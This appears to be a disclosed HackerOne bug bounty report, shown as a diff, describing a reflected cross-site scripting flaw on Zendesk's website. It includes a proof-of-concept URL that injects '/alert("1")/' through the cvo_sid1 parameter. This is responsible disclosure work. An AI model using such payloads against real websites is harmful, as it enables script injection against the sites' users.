@@ -1,0 +1,16 @@
+ReportLink:https://hackerone.com/reports/89624
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/mdv
+ReportedTo:Zendesk(zendesk)
+BountyAmount:100.0
+Severity:
+State:Closed
+DateOfDisclosure:09.12.2015 2:06:13
+
+Summary:
+
+Hello.
+https://www.zendesk.com/product/pricing/#?cvo_sid1=%22/alert%28%221%22%29/%22
+This XSS can be done on most pages of this site.
+Vulnerable param is cvo_sid1. For the XSS i used "/alert("1")/"
+Tested in Mozilla Firefox
